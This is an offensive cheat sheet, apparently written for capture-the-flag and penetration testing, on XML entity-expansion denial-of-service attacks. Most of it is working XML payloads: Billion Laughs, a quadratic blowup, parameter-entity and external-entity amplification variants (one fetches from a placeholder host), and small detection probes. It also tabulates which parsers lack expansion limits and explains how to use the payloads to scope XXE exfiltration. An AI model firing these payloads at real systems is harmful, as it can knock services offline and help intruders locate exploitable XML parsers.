# Entity Expansion — Billion Laughs and the DoS Surface

## The classic — exponential expansion

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lollollollollollollollollollol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Each level multiplies by 10 — `&lol9;` expands to ~3×10⁹ chars ≈ 3GB —
the parser OOMs. **Detection payload** too: if it returns instantly, the
parser either didn't expand entities or has a limit — if it hangs/500s,
entity expansion is live (and you know entities resolve = XXE surface).

## The quadratic variant — linear blowup

```xml
<!DOCTYPE x [
  <!ENTITY a "aaaa...aaa">     <!-- ~50KB of 'a' -->
]>
<x>&a;&a;&a;...~100k refs...&a;</x>
```

50KB entity × 100k references ≈ 5GB — no deep nesting needed, dodges
"max entity depth" limits that catch nested Billion Laughs.

## Parameter-entity laugh — inside the DTD

```xml
<!DOCTYPE x [
  <!ENTITY % a "xxxxxx...">
  <!ENTITY % b "%a;%a;%a;%a;%a;%a;%a;%a;%a;%a;">
  %b;
]>
```

Expansion inside the DTD — some "no entity expansion" settings only
guard the document body, not the DTD itself.

## External-entity laugh — fetch amplification

```xml
<!ENTITY % a SYSTEM "http://YOU/big">
<!ENTITY % b "%a;%a;%a;%a;%a;">
```

Each expansion = one fetch — multiplies the outbound request count —
and if the fetched doc itself contains entities… cascade.

## Where this actually fires — parser defenses

| Parser | Default limit |
|---|---|
| .NET XmlReader | `MaxCharactersFromEntities` (default ~10M) → `XmlException: limit exceeded` |
| Java Xerces | `entityExpansionLimit` (64000) + `totalEntitySizeLimit` (50M) → `SAXParseException` |
| libxml2 | amplification cap (amplification factor ~100) → `Detected an entity reference loop` / amplification error |
| Python ElementTree | expands internal entities — no cap → laughs work |
| Go encoding/xml | no entities at all — immune |
| defusedxml | raises `EntitiesForbidden`/`DTDForbidden` immediately |

## Why it matters for the XXE skill — three uses

1. **Detection** — a hang/500 on the laugh payload = entities expand =
   the XXE surface is live (with a falsifier: could also be a pure DoS
   with no resolution — follow up with the internal-entity echo)
2. **Limit measurement** — binary-search the entity count/size to learn
   the parser's expansion cap → whether blind-XXE exfil via error/URL
   has headroom
3. **The DoS class itself** — in attack-defense, this is a real attack;
   in jeopardy, a DoS usually loses you the instance — don't fire
   laughs on shared infra, use the minimal version

## The minimal detection laugh — 2 levels only

```xml
<!DOCTYPE r [
  <!ENTITY a "12345678">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
]>
<r>&b;</r>
```

512 chars out — enough to prove expansion happens without DoSing.

## The `&a;`-loop — self-reference detection

```xml
<!ENTITY a "&b;">
<!ENTITY b "&a;">
```

Circular reference — parser must reject it; HOW it rejects (error type,
hang, immediate) fingerprints the parser: libxml2 says `Detected an
entity reference loop`, Java says `recursive entity reference`, .NET
`XmlException`.

## Falsifiers

- instant `EntitiesForbidden`/`DTD is prohibited` → defused/hardened —
  expansion dead, entities dead
- the response never changes regardless of expansion size → parser
  isn't expanding at all (Go, strict ElementTree)
